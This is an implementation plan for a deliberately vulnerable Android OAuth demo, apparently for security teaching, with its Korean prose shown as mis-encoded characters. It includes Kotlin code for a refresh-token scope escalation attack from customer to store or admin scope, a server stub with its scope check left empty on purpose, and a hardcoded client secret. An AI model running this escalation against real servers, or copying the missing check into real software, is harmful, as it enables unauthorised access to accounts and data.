# OAuth 2.0 Refresh Token Scope ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì  í†µí•© êµ¬í˜„ ë‹¨ê³„

## ğŸ“‹ í”„ë¡œì íŠ¸ ê°œìš”

**ëª©í‘œ:** OAuth 2.0 Refresh Token Scope ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì ì„ ë°˜ì˜í•œ Android ì•± í†µí•©
**ì¤‘ìš”:** Admin ê¶Œí•œ íƒˆì·¨ê°€ ê°€ëŠ¥í•œ ì·¨ì•½ì ì„ ë°ëª¨ë¡œ êµ¬í˜„

---

## ğŸ” í˜„ì¬ ìƒíƒœ ë¶„ì„

### ê¸°ì¡´ ì•± êµ¬ì¡°
- **ë©”ì¸ ì—”íŠ¸ë¦¬:** `StoreListActivity` (LAUNCHER)
- **ë„¤íŠ¸ì›Œí‚¹:** Retrofit + OkHttp
- **API ì„œë²„:** `http://10.0.2.2:8080` (ê¸°ì¡´ Spring Boot ì„œë²„)
- **OAuth ì„œë²„:** `http://10.0.2.2:3000` (Flask OAuth ì„œë²„, ë³„ë„ ì‹¤í–‰ í•„ìš”)

### í•„ìš”í•œ ê¸°ëŠ¥
1. âœ… OAuth 2.0 ë¡œê·¸ì¸ (Authorization Code + PKCE)
2. âœ… Customer/Store Scope ë¡œê·¸ì¸
3. âœ… **ğŸš¨ Scope ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì ** (Refresh Tokenìœ¼ë¡œ scope ë³€ê²½)
4. âœ… Customer API í˜¸ì¶œ (`/api/customer/orders`)
5. âœ… Store API í˜¸ì¶œ (`/api/store/dashboard`)

---

## ğŸ“ êµ¬í˜„ ë‹¨ê³„ (Step-by-Step)

### **Step 1: ì˜ì¡´ì„± ì¶”ê°€**

**íŒŒì¼:** `mobile/app/build.gradle.kts`

**ì¶”ê°€í•  ì˜ì¡´ì„±:**
```kotlin
dependencies {
    // ... ê¸°ì¡´ ì˜ì¡´ì„± ...
    
    // â˜… AppAuth-Android (OAuth 2.0 í´ë¼ì´ì–¸íŠ¸)
    implementation("net.openid:appauth:0.11.1")
    
    // â˜… Custom Tabs (OAuth ì¸ì¦ ë¸Œë¼ìš°ì €)
    implementation("androidx.browser:browser:1.7.0")
}
```

**ì‘ì—…:**
- [x] `build.gradle.kts` íŒŒì¼ ìˆ˜ì •
- [ ] Gradle Sync ì‹¤í–‰

---

### **Step 2: OAuth ì„¤ì • ìƒìˆ˜ ì •ì˜**

**íŒŒì¼:** `mobile/app/src/main/java/com/example/mobile/data/auth/OAuthConfig.kt` (ìƒˆë¡œ ìƒì„±)

**ë‚´ìš©:**
```kotlin
package com.example.mobile.data.auth

object OAuthConfig {
    // OAuth ì„œë²„ URL (ì—ë®¬ë ˆì´í„°: 10.0.2.2, ì‹¤ì œ ê¸°ê¸°: í˜¸ìŠ¤íŠ¸ IP)
    const val AUTH_SERVER_URL = "http://10.0.2.2:3000"
    
    // OAuth í´ë¼ì´ì–¸íŠ¸ ì •ë³´ (ì„œë²„ì—ì„œ ë“±ë¡í•œ ê°’)
    const val CLIENT_ID = "android_app_client"
    const val CLIENT_SECRET = "secret123"  // âš ï¸ ë°ëª¨ìš©, í”„ë¡œë•ì…˜ì—ì„œëŠ” ì œê±°
    
    // Redirect URI
    const val REDIRECT_URI = "app://oauth2callback"
    
    // Scopes
    const val SCOPE_CUSTOMER = "customer"
    const val SCOPE_STORE = "store"
    const val SCOPE_ADMIN = "admin"  // ğŸš¨ ê¶Œí•œ ìƒìŠ¹ ëª©í‘œ
}
```

**ì‘ì—…:**
- [ ] `OAuthConfig.kt` íŒŒì¼ ìƒì„±
- [ ] OAuth ì„œë²„ì—ì„œ í´ë¼ì´ì–¸íŠ¸ ë“±ë¡ í™•ì¸ (`/admin/register_client`)

---

### **Step 3: AuthStateManager êµ¬í˜„ (í† í° ì €ì¥/ê´€ë¦¬)**

**íŒŒì¼:** `mobile/app/src/main/java/com/example/mobile/data/auth/AuthStateManager.kt` (ìƒˆë¡œ ìƒì„±)

**ê¸°ëŠ¥:**
- OAuth ì¸ì¦ ìƒíƒœ ì €ì¥ (SharedPreferences)
- Access Token, Refresh Token ê´€ë¦¬
- Scope ì •ë³´ ì €ì¥
- í† í° ë§Œë£Œ ì‹œê°„ ê´€ë¦¬

**ì£¼ìš” ë©”ì„œë“œ:**
```kotlin
class AuthStateManager(context: Context) {
    fun saveAuthState(authState: AuthState)
    fun getCurrentAuthState(): AuthState?
    fun clearAuthState()
    fun hasValidToken(): Boolean
    fun getCurrentScope(): String?
}
```

**ì‘ì—…:**
- [ ] `AuthStateManager.kt` íŒŒì¼ ìƒì„±
- [ ] SharedPreferencesë¡œ í† í° ì €ì¥/ë¡œë“œ êµ¬í˜„
- [ ] AuthState ì§ë ¬í™”/ì—­ì§ë ¬í™” ì²˜ë¦¬

---

### **Step 4: OAuth API ì¸í„°í˜ì´ìŠ¤ ì¶”ê°€**

**íŒŒì¼:** `mobile/app/src/main/java/com/example/mobile/data/network/OAuthApi.kt` (ìƒˆë¡œ ìƒì„±)

**í•„ìš”í•œ ì—”ë“œí¬ì¸íŠ¸:**
```kotlin
interface OAuthApi {
    // Refresh Tokenìœ¼ë¡œ í† í° ê°±ì‹  (ğŸš¨ ì·¨ì•½ì : scope ë³€ê²½ ê°€ëŠ¥)
    @FormUrlEncoded
    @POST("oauth/token")
    suspend fun refreshToken(
        @Field("grant_type") grantType: String,
        @Field("refresh_token") refreshToken: String,
        @Field("scope") scope: String,  // ğŸš¨ ê¶Œí•œ ìƒìŠ¹ í¬ì¸íŠ¸
        @Field("client_id") clientId: String,
        @Field("client_secret") clientSecret: String
    ): TokenResponse
    
    // ì‚¬ìš©ì ì •ë³´ ì¡°íšŒ
    @GET("api/me")
    suspend fun getMe(@Header("Authorization") token: String): UserInfoResponse
}
```

**ì‘ì—…:**
- [ ] `OAuthApi.kt` íŒŒì¼ ìƒì„±
- [ ] TokenResponse, UserInfoResponse ëª¨ë¸ ìƒì„±
- [ ] OAuth ì„œë²„ìš© ë³„ë„ Retrofit ì¸ìŠ¤í„´ìŠ¤ ìƒì„± (ApiClientì— ì¶”ê°€)

---

### **Step 5: Customer/Store API ì¸í„°í˜ì´ìŠ¤ ì¶”ê°€**

**íŒŒì¼:** `mobile/app/src/main/java/com/example/mobile/data/network/CustomerApi.kt` (ìƒˆë¡œ ìƒì„±)
**íŒŒì¼:** `mobile/app/src/main/java/com/example/mobile/data/network/StoreApi.kt` (ê¸°ì¡´ íŒŒì¼ ìˆ˜ì •)

**CustomerApi.kt:**
```kotlin
interface CustomerApi {
    @GET("api/customer/orders")
    suspend fun getCustomerOrders(
        @Header("Authorization") token: String
    ): CustomerOrdersResponse
}
```

**StoreApi.kt (ê¸°ì¡´ì— ì¶”ê°€):**
```kotlin
interface StoreApi {
    // ... ê¸°ì¡´ ë©”ì„œë“œ ...
    
    // ì ì£¼ ëŒ€ì‹œë³´ë“œ (Store scope í•„ìš”)
    @GET("api/store/dashboard")
    suspend fun getStoreDashboard(
        @Header("Authorization") token: String
    ): StoreDashboardResponse
}
```

**ì‘ì—…:**
- [ ] `CustomerApi.kt` íŒŒì¼ ìƒì„±
- [ ] `StoreApi.kt`ì— Store Dashboard ë©”ì„œë“œ ì¶”ê°€
- [ ] Response ëª¨ë¸ ìƒì„± (CustomerOrdersResponse, StoreDashboardResponse)
- [ ] ApiClientì— CustomerApi ì¶”ê°€

---

### **Step 6: AndroidManifest.xml ìˆ˜ì •**

**íŒŒì¼:** `mobile/app/src/main/AndroidManifest.xml`

**ì¶”ê°€í•  ë‚´ìš©:**
```xml
<!-- OAuth ì½œë°± ì²˜ë¦¬ Activity -->
<activity
    android:name=".ui.auth.OAuthCallbackActivity"
    android:exported="true"
    android:launchMode="singleTask">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data
            android:scheme="app"
            android:host="oauth2callback" />
    </intent-filter>
</activity>

<!-- ë¡œê·¸ì¸ Activity -->
<activity
    android:name=".ui.auth.LoginActivity"
    android:exported="false" />

<!-- OAuth í…ŒìŠ¤íŠ¸ ëŒ€ì‹œë³´ë“œ (ê¶Œí•œ ìƒìŠ¹ ë°ëª¨ìš©) -->
<activity
    android:name=".ui.auth.OAuthDashboardActivity"
    android:exported="false" />
```

**ì‘ì—…:**
- [ ] AndroidManifest.xmlì— Activity ë“±ë¡
- [ ] OAuth Redirect URI Intent Filter ì¶”ê°€

---

### **Step 7: LoginActivity êµ¬í˜„**

**íŒŒì¼:** `mobile/app/src/main/java/com/example/mobile/ui/auth/LoginActivity.kt` (ìƒˆë¡œ ìƒì„±)
**ë ˆì´ì•„ì›ƒ:** `mobile/app/src/main/res/layout/activity_login.xml` (ìƒˆë¡œ ìƒì„±)

**ê¸°ëŠ¥:**
1. Customer Scope ë¡œê·¸ì¸ ë²„íŠ¼
2. Store Scope ë¡œê·¸ì¸ ë²„íŠ¼
3. AppAuthë¥¼ ì‚¬ìš©í•œ Authorization Code + PKCE Flow
4. ë¡œê·¸ì¸ ì„±ê³µ ì‹œ OAuthDashboardActivityë¡œ ì´ë™

**ì£¼ìš” ì½”ë“œ êµ¬ì¡°:**
```kotlin
class LoginActivity : AppCompatActivity() {
    private lateinit var authStateManager: AuthStateManager
    
    private fun loginWithScope(scope: String) {
        val serviceConfig = AuthorizationServiceConfiguration(
            Uri.parse("${OAuthConfig.AUTH_SERVER_URL}/oauth/authorize"),
            Uri.parse("${OAuthConfig.AUTH_SERVER_URL}/oauth/token")
        )
        
        val request = AuthorizationRequest.Builder(
            serviceConfig,
            OAuthConfig.CLIENT_ID,
            ResponseTypeValues.CODE,
            Uri.parse(OAuthConfig.REDIRECT_URI)
        )
            .setScope(scope)
            .setCodeVerifier(codeVerifier)  // PKCE
            .build()
        
        // Custom Tabsë¡œ ì¸ì¦ í˜ì´ì§€ ì—´ê¸°
        authService.performAuthorizationRequest(request, ...)
    }
}
```

**ì‘ì—…:**
- [ ] `LoginActivity.kt` íŒŒì¼ ìƒì„±
- [ ] `activity_login.xml` ë ˆì´ì•„ì›ƒ ìƒì„±
- [ ] AppAuth Authorization Flow êµ¬í˜„
- [ ] PKCE ì½”ë“œ ìƒì„±/ê²€ì¦ êµ¬í˜„

---

### **Step 8: OAuthCallbackActivity êµ¬í˜„**

**íŒŒì¼:** `mobile/app/src/main/java/com/example/mobile/ui/auth/OAuthCallbackActivity.kt` (ìƒˆë¡œ ìƒì„±)

**ê¸°ëŠ¥:**
1. Authorization Code ìˆ˜ì‹ 
2. Access Token êµí™˜
3. AuthStateManagerì— í† í° ì €ì¥
4. OAuthDashboardActivityë¡œ ì´ë™

**ì£¼ìš” ì½”ë“œ:**
```kotlin
class OAuthCallbackActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        val response = AuthorizationResponse.fromIntent(intent)
        val exception = AuthorizationException.fromIntent(intent)
        
        if (response != null) {
            // Authorization Codeë¡œ Access Token êµí™˜
            authService.performTokenRequest(
                response.createTokenExchangeRequest(),
                { tokenResponse, ex ->
                    if (tokenResponse != null) {
                        val authState = AuthState(response, tokenResponse)
                        authStateManager.saveAuthState(authState)
                        // ëŒ€ì‹œë³´ë“œë¡œ ì´ë™
                    }
                }
            )
        }
    }
}
```

**ì‘ì—…:**
- [ ] `OAuthCallbackActivity.kt` íŒŒì¼ ìƒì„±
- [ ] Authorization Code ì²˜ë¦¬ ë¡œì§ êµ¬í˜„
- [ ] Token Exchange êµ¬í˜„

---

### **Step 9: OAuthDashboardActivity êµ¬í˜„ (ğŸš¨ ì·¨ì•½ì  ë°ëª¨)**

**íŒŒì¼:** `mobile/app/src/main/java/com/example/mobile/ui/auth/OAuthDashboardActivity.kt` (ìƒˆë¡œ ìƒì„±)
**ë ˆì´ì•„ì›ƒ:** `mobile/app/src/main/res/layout/activity_oauth_dashboard.xml` (ìƒˆë¡œ ìƒì„±)

**ê¸°ëŠ¥:**
1. í˜„ì¬ ë¡œê·¸ì¸ ìƒíƒœ í‘œì‹œ (Scope ì •ë³´)
2. Customer API í˜¸ì¶œ ë²„íŠ¼
3. Store API í˜¸ì¶œ ë²„íŠ¼
4. **ğŸš¨ Scope ê¶Œí•œ ìƒìŠ¹ ê³µê²© ë²„íŠ¼** (í•µì‹¬ ê¸°ëŠ¥)
5. ë¡œê·¸ì•„ì›ƒ ë²„íŠ¼

**ë ˆì´ì•„ì›ƒ êµ¬ì„±:**
```xml
- TextView: í˜„ì¬ Scope í‘œì‹œ
- Button: Customer API í˜¸ì¶œ
- Button: Store API í˜¸ì¶œ (ì´ˆê¸°ì—ëŠ” ì‹¤íŒ¨í•´ì•¼ í•¨)
- Button: ğŸš¨ Scope ê¶Œí•œ ìƒìŠ¹ ê³µê²©
- TextView: API ì‘ë‹µ ë¡œê·¸
- Button: ë¡œê·¸ì•„ì›ƒ
```

**ê¶Œí•œ ìƒìŠ¹ ê³µê²© ì½”ë“œ (í•µì‹¬):**
```kotlin
private fun exploitScopeEscalation() {
    val currentAuthState = authStateManager.getCurrentAuthState()
    val refreshToken = currentAuthState?.refreshToken ?: return
    
    lifecycleScope.launch {
        try {
            // ğŸš¨ ì·¨ì•½ì : Refresh Tokenìœ¼ë¡œ ë‹¤ë¥¸ scope ìš”ì²­
            val response = oAuthApi.refreshToken(
                grantType = "refresh_token",
                refreshToken = refreshToken,
                scope = OAuthConfig.SCOPE_STORE,  // customer â†’ store ê¶Œí•œ ìƒìŠ¹!
                clientId = OAuthConfig.CLIENT_ID,
                clientSecret = OAuthConfig.CLIENT_SECRET
            )
            
            // ìƒˆë¡œìš´ í† í° ì €ì¥
            val newAuthState = AuthState(
                authorizationResponse = null,
                tokenResponse = response
            )
            authStateManager.saveAuthState(newAuthState)
            
            // ì„±ê³µ ë©”ì‹œì§€
            Toast.makeText(
                this@OAuthDashboardActivity,
                "ğŸš¨ ê¶Œí•œ ìƒìŠ¹ ì„±ê³µ! customer â†’ store",
                Toast.LENGTH_LONG
            ).show()
            
            // UI ì—…ë°ì´íŠ¸
            updateScopeDisplay()
            
        } catch (e: Exception) {
            Toast.makeText(
                this@OAuthDashboardActivity,
                "ê¶Œí•œ ìƒìŠ¹ ì‹¤íŒ¨: ${e.message}",
                Toast.LENGTH_SHORT
            ).show()
        }
    }
}
```

**ì‘ì—…:**
- [ ] `OAuthDashboardActivity.kt` íŒŒì¼ ìƒì„±
- [ ] `activity_oauth_dashboard.xml` ë ˆì´ì•„ì›ƒ ìƒì„±
- [ ] Customer API í˜¸ì¶œ êµ¬í˜„
- [ ] Store API í˜¸ì¶œ êµ¬í˜„
- [ ] **ğŸš¨ Scope ê¶Œí•œ ìƒìŠ¹ ê³µê²© ê¸°ëŠ¥ êµ¬í˜„** (í•µì‹¬)
- [ ] API ì‘ë‹µ ë¡œê·¸ í‘œì‹œ

---

### **Step 10: ApiClient ìˆ˜ì • (OAuth ì„œë²„ ì—°ê²°)**

**íŒŒì¼:** `mobile/app/src/main/java/com/example/mobile/data/network/ApiClient.kt`

**ìˆ˜ì • ë‚´ìš©:**
```kotlin
object ApiClient {
    // ê¸°ì¡´ API ì„œë²„ (Spring Boot)
    private val retrofit: Retrofit = Retrofit.Builder()
        .baseUrl("http://10.0.2.2:8080/")
        .client(okHttpClient)
        .addConverterFactory(GsonConverterFactory.create())
        .build()
    
    // OAuth ì„œë²„ (Flask) - ë³„ë„ ì¸ìŠ¤í„´ìŠ¤
    private val oauthRetrofit: Retrofit = Retrofit.Builder()
        .baseUrl("http://10.0.2.2:3000/")
        .client(okHttpClient)
        .addConverterFactory(GsonConverterFactory.create())
        .build()
    
    // ê¸°ì¡´ API
    val storeApi: StoreApi = retrofit.create(StoreApi::class.java)
    val myPageApi: MyPageApi = retrofit.create(MyPageApi::class.java)
    val cartApi: CartApi = retrofit.create(CartApi::class.java)
    val orderApi: OrderApi = retrofit.create(OrderApi::class.java)
    
    // OAuth API
    val oAuthApi: OAuthApi = oauthRetrofit.create(OAuthApi::class.java)
    val customerApi: CustomerApi = oauthRetrofit.create(CustomerApi::class.java)
}
```

**ì‘ì—…:**
- [ ] OAuth ì„œë²„ìš© Retrofit ì¸ìŠ¤í„´ìŠ¤ ì¶”ê°€
- [ ] OAuthApi, CustomerApi ì¶”ê°€

---

### **Step 11: ì•± ì‹œì‘ ì‹œ ë¡œê·¸ì¸ ì²´í¬ (ì„ íƒì‚¬í•­)**

**íŒŒì¼:** `mobile/app/src/main/java/com/example/mobile/ui/storelist/StoreListActivity.kt`

**ì˜µì…˜ A: ë¡œê·¸ì¸ í•„ìˆ˜ë¡œ ë³€ê²½**
- StoreListActivity ì‹œì‘ ì „ì— ë¡œê·¸ì¸ ìƒíƒœ í™•ì¸
- ë¯¸ë¡œê·¸ì¸ ì‹œ LoginActivityë¡œ ë¦¬ë‹¤ì´ë ‰íŠ¸

**ì˜µì…˜ B: ê¸°ì¡´ ë™ì‘ ìœ ì§€ (ê¶Œì¥)**
- StoreListActivityëŠ” ê·¸ëŒ€ë¡œ ìœ ì§€
- OAuth ê¸°ëŠ¥ì€ ë³„ë„ ë©”ë‰´ì—ì„œ ì ‘ê·¼
- ë§ˆì´í˜ì´ì§€ì— "OAuth í…ŒìŠ¤íŠ¸" ë©”ë‰´ ì¶”ê°€

**ì‘ì—…:**
- [ ] ì„ íƒ: ë¡œê·¸ì¸ ì²´í¬ ë¡œì§ ì¶”ê°€ ë˜ëŠ” ê¸°ì¡´ ìœ ì§€

---

### **Step 12: ë°ì´í„° ëª¨ë¸ ìƒì„±**

**íŒŒì¼ë“¤:**
- `mobile/app/src/main/java/com/example/mobile/data/model/TokenResponse.kt`
- `mobile/app/src/main/java/com/example/mobile/data/model/UserInfoResponse.kt`
- `mobile/app/src/main/java/com/example/mobile/data/model/CustomerOrdersResponse.kt`
- `mobile/app/src/main/java/com/example/mobile/data/model/StoreDashboardResponse.kt`

**TokenResponse.kt ì˜ˆì‹œ:**
```kotlin
data class TokenResponse(
    @SerializedName("access_token") val accessToken: String,
    @SerializedName("token_type") val tokenType: String,
    @SerializedName("expires_in") val expiresIn: Int,
    @SerializedName("refresh_token") val refreshToken: String,
    @SerializedName("scope") val scope: String
)
```

**ì‘ì—…:**
- [ ] ëª¨ë“  Response ëª¨ë¸ ìƒì„±
- [ ] Gson ì–´ë…¸í…Œì´ì…˜ ì¶”ê°€

---

## ğŸš¨ ì·¨ì•½ì  êµ¬í˜„ í•µì‹¬ í¬ì¸íŠ¸

### 1. Refresh Token Scope ë³€ê²½ í—ˆìš©
**ìœ„ì¹˜:** `OAuthDashboardActivity.kt` - `exploitScopeEscalation()`

**í•µì‹¬ ì½”ë“œ:**
```kotlin
// ğŸš¨ ì·¨ì•½ì : ì›ë˜ scope(customer)ë¡œ ë°›ì€ Refresh Tokenìœ¼ë¡œ
// ë‹¤ë¥¸ scope(store, admin) ìš”ì²­ ì‹œ ì„œë²„ê°€ ê²€ì¦í•˜ì§€ ì•ŠìŒ
val response = oAuthApi.refreshToken(
    grantType = "refresh_token",
    refreshToken = refreshToken,
    scope = OAuthConfig.SCOPE_STORE,  // ì›ë˜ scopeì™€ ë‹¤ë¦„!
    clientId = OAuthConfig.CLIENT_ID,
    clientSecret = OAuthConfig.CLIENT_SECRET
)
```

### 2. ì„œë²„ ì¸¡ ì·¨ì•½ì  (OAuth ì„œë²„)
**ìœ„ì¹˜:** `auth/oauth2.py` (íŒ€ì›ì´ êµ¬í˜„í•œ ì„œë²„)

**ì·¨ì•½ì :**
```python
class RefreshTokenGrant(grants.RefreshTokenGrant):
    def _validate_token_scope(self, token):
        # ğŸš¨ VULNERABILITY: No scope validation!
        pass  # ì•„ë¬´ ê²€ì¦ë„ í•˜ì§€ ì•ŠìŒ
```

**ì˜¬ë°”ë¥¸ êµ¬í˜„ (ì°¸ê³ ìš©, ìˆ˜ì •í•˜ì§€ ì•ŠìŒ):**
```python
def _validate_token_scope(self, token):
    requested_scope = self.request.data.get('scope', token.scope)
    requested_set = set(requested_scope.split())
    original_set = set(token.scope.split())
    
    if not requested_set.issubset(original_set):
        raise InvalidScopeError('Scope escalation detected')
```

---

## ğŸ“‹ í…ŒìŠ¤íŠ¸ ì‹œë‚˜ë¦¬ì˜¤

### ì‹œë‚˜ë¦¬ì˜¤ 1: ì •ìƒ ë¡œê·¸ì¸ ë° API í˜¸ì¶œ
1. ì•± ì‹¤í–‰ â†’ LoginActivity
2. "ê³ ê°ìœ¼ë¡œ ë¡œê·¸ì¸ (Customer Scope)" í´ë¦­
3. ë¸Œë¼ìš°ì €ì—ì„œ OAuth ì¸ì¦ ì™„ë£Œ
4. OAuthDashboardActivityë¡œ ì´ë™
5. "Customer API í˜¸ì¶œ" â†’ ì„±ê³µ âœ…
6. "Store API í˜¸ì¶œ" â†’ `insufficient_scope` ì—ëŸ¬ âŒ

### ì‹œë‚˜ë¦¬ì˜¤ 2: ğŸš¨ ê¶Œí•œ ìƒìŠ¹ ê³µê²©
1. Customer Scopeë¡œ ë¡œê·¸ì¸ ì™„ë£Œ
2. "ğŸš¨ Scope ê¶Œí•œ ìƒìŠ¹ ê³µê²©" ë²„íŠ¼ í´ë¦­
3. Refresh Tokenìœ¼ë¡œ Store Scope ìš”ì²­
4. ì„œë²„ê°€ ê²€ì¦ ì—†ì´ Store Scope í† í° ë°œê¸‰ âœ…
5. "Store API í˜¸ì¶œ" â†’ ì„±ê³µ! ğŸ¯
6. ì ì£¼ ëŒ€ì‹œë³´ë“œ ë°ì´í„° ì¡°íšŒ ê°€ëŠ¥ (ë§¤ì¶œ, ê³ ê° ì •ë³´ ë“±)

### ì‹œë‚˜ë¦¬ì˜¤ 3: Admin ê¶Œí•œ íƒˆì·¨ (ìµœì¢… ëª©í‘œ)
1. Customer ë˜ëŠ” Store Scopeë¡œ ë¡œê·¸ì¸
2. "ğŸš¨ Scope ê¶Œí•œ ìƒìŠ¹ ê³µê²©" ë²„íŠ¼ í´ë¦­
3. Scopeë¥¼ `admin`ìœ¼ë¡œ ë³€ê²½
4. Admin ê¶Œí•œìœ¼ë¡œ ëª¨ë“  API ì ‘ê·¼ ê°€ëŠ¥ ğŸš¨

---

## âš ï¸ ì£¼ì˜ì‚¬í•­

### 1. DB ë°˜ì˜ ì‹œ ì£¼ì˜
- **ì·¨ì•½ì  ëª©ì :** Admin ê¶Œí•œ íƒˆì·¨ ê°€ëŠ¥ì„±ì„ ë°ëª¨
- **ì‹¤ì œ í™˜ê²½:** ì ˆëŒ€ ì´ ì·¨ì•½ì ì„ í”„ë¡œë•ì…˜ì— ë°°í¬í•˜ì§€ ì•ŠìŒ
- **ë¬¸ì„œí™”:** ì·¨ì•½ì  ì„¤ëª… ë° ë³´ì•ˆ ê¶Œì¥ì‚¬í•­ ëª…ì‹œ

### 2. ì„œë²„ URL ì„¤ì •
- **ì—ë®¬ë ˆì´í„°:** `10.0.2.2:3000` (OAuth), `10.0.2.2:8080` (API)
- **ì‹¤ì œ ê¸°ê¸°:** í˜¸ìŠ¤íŠ¸ PCì˜ IP ì£¼ì†Œ ì‚¬ìš©
- **OAuth ì„œë²„ ì‹¤í–‰:** `python app.py --host=0.0.0.0`

### 3. Client Secret ê´€ë¦¬
- í˜„ì¬ëŠ” ë°ëª¨ìš©ìœ¼ë¡œ í•˜ë“œì½”ë”©
- í”„ë¡œë•ì…˜ì—ì„œëŠ” Public Client ë˜ëŠ” PKCEë§Œ ì‚¬ìš©

---

## âœ… ì²´í¬ë¦¬ìŠ¤íŠ¸

### Phase 1: ê¸°ë³¸ ì„¤ì •
- [x] Step 1: ì˜ì¡´ì„± ì¶”ê°€ (AppAuth)
- [ ] Step 2: OAuthConfig ìƒì„±
- [ ] Step 3: AuthStateManager êµ¬í˜„
- [ ] Step 4: OAuthApi ì¸í„°í˜ì´ìŠ¤ ìƒì„±
- [ ] Step 5: CustomerApi, StoreApi ì¶”ê°€
- [ ] Step 6: AndroidManifest.xml ìˆ˜ì •
- [ ] Step 12: ë°ì´í„° ëª¨ë¸ ìƒì„±

### Phase 2: UI êµ¬í˜„
- [ ] Step 7: LoginActivity êµ¬í˜„
- [ ] Step 8: OAuthCallbackActivity êµ¬í˜„
- [ ] Step 9: OAuthDashboardActivity êµ¬í˜„
- [ ] Step 10: ApiClient ìˆ˜ì •

### Phase 3: ì·¨ì•½ì  êµ¬í˜„
- [ ] Step 9: **ğŸš¨ Scope ê¶Œí•œ ìƒìŠ¹ ê³µê²© ê¸°ëŠ¥** êµ¬í˜„
- [ ] í…ŒìŠ¤íŠ¸ ì‹œë‚˜ë¦¬ì˜¤ 1 ì‹¤í–‰
- [ ] í…ŒìŠ¤íŠ¸ ì‹œë‚˜ë¦¬ì˜¤ 2 ì‹¤í–‰
- [ ] í…ŒìŠ¤íŠ¸ ì‹œë‚˜ë¦¬ì˜¤ 3 ì‹¤í–‰ (Admin ê¶Œí•œ íƒˆì·¨)

### Phase 4: í†µí•© ë° í…ŒìŠ¤íŠ¸
- [ ] Step 11: ì•± ì‹œì‘ ì‹œ ë¡œê·¸ì¸ ì²´í¬ (ì„ íƒ)
- [ ] ì „ì²´ í”Œë¡œìš° í…ŒìŠ¤íŠ¸
- [ ] ì·¨ì•½ì  ë™ì‘ í™•ì¸
- [ ] ë¬¸ì„œí™” ì™„ë£Œ

---

## ğŸ“š ì°¸ê³  ìë£Œ

- [AppAuth-Android GitHub](https://github.com/openid/AppAuth-Android)
- [OAuth 2.0 RFC 6749](https://datatracker.ietf.org/doc/html/rfc6749)
- [PKCE RFC 7636](https://datatracker.ietf.org/doc/html/rfc7636)
- [OWASP - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)

---

**ì‘ì„±ì¼:** 2024ë…„
**ëª©ì :** OAuth 2.0 Refresh Token Scope ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì  ë°ëª¨
**ìƒíƒœ:** êµ¬í˜„ ì¤€ë¹„ ì™„ë£Œ âœ…
